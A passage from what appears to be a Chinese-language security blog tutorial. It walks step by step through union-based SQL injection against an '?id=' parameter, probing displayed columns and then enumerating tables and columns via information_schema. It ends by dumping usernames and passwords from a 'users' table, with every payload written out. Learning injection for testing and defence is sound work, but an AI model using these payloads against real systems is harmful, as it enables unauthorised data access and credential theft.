+<p><img src="https://tva2.sinaimg.cn/large/008gHraJly8h0k0103iinj30tp0amab5.jpg" alt="img"></p>
+<p>然后我们利用?id&#x3D;-1’ union select 1,2,3%23  确认回显的位置(因为上面order by时到四不行了，所以前面这个表只有三行 )</p>
+<p>同时说明，如果select一个数的话，他是会直接把数显出来的，正好验证了上面所说的列数不够时随便用数凑。</p>
+<p>还有这里为什么是-1，其实只要是它实际id里没有的就行，不然第一个id就回显了。后面的select没地方显示了。-1的意义就是想办法把他弄到搜不到内容</p>
+<p>比如在?id&#x3D;1’后面接and 1&#x3D;2也是同样效果</p>
+<p><img src="https://tva3.sinaimg.cn/large/008gHraJly8h0jpwqmzvqj30sy0g4764.jpg" alt="img"></p>
+<p>我们已经找到了 2，3的地方可以显示数据。所以我们用这两个位置查询一下数据库的名称以及版本。我们可以根据版本选择接下来的注入方式。</p>
+<p><img src="https://tva2.sinaimg.cn/large/008gHraJly8h0k0ouoeyij30ol0iu76j.jpg" alt="img"></p>
+<p>接下来爆表名，?id&#x3D;1%27%20and%201&#x3D;2%20union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()<br>– 奥特光线&gt;—~~~~~~~~</p>
+<p><img src="https://tva1.sinaimg.cn/large/008gHraJly8h0k2dbo2i7j30ue0nqju3.jpg" alt="img"></p>
+<p>接下里爆列名，只要我们再拿到列名，我们就可以随便查看表里内容了。</p>
+<p>这里小偷一波懒，直接选择查看users表的信息，直接爆出users表的列名</p>
+<p>?id&#x3D;1%27%20and%201&#x3D;2%20union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’<br>– QaQ&gt;_&lt;</p>
+<p><img src="https://tva3.sinaimg.cn/large/008gHraJly8h0k1zws6v5j30ym0nsjuc.jpg" alt="img"></p>
+<p>接下来我们就可以爆出users表中的所有信息了</p>
+<p>?id&#x3D;1%27%20and%201&#x3D;2%20union select 1,2,group_concat(id,0x3a,username,0x3a,password,0x7e) from users<br>– ．&lt;{&#x3D;．．．．（嘎<del>嘎</del>嘎~）</p>
+<p><img src="https://tva4.sinaimg.cn/large/008gHraJly8h0k22ztfsqj318g0nsjvi.jpg" alt="img"></p>
+<p>只要重复上面的几步，爆出其他表的列名就可以爆出所有表的内容了</p>
+</div></div></article></section><nav class="paginator"><div class="paginator-inner"><a class="extend prev" rel="prev" href="/page/2/"><i class="fas fa-angle-left"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/4/"><i class="fas fa-angle-right"></i></a></div></nav></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><section class="sidebar-toc hide"></section><!-- ov = overview--><section class="sidebar-ov"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/stun-logo.png" alt="avatar"></div><p class="sidebar-ov-author__text">世间本浑浊，罪与爱同歌</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">35</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">15</div><div class="sidebar-ov-state-item__name">分类</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">17</div><div class="sidebar-ov-state-item__name">标签</div></a></div></section></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2022</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>Sanyer</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script></body></html>
